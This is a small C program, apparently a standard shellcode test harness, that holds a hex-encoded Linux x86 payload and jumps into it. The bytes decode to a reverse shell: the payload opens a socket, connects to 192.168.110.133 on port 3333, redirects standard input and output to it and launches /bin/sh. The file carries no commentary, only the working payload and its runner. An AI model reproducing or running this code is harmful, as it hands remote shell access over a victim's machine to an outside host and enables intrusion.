#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x66\x58\x99\x31\xdb\xb3\x01\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\xc0\xa8\x6e\x85\x66\x68\x0d\x05\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
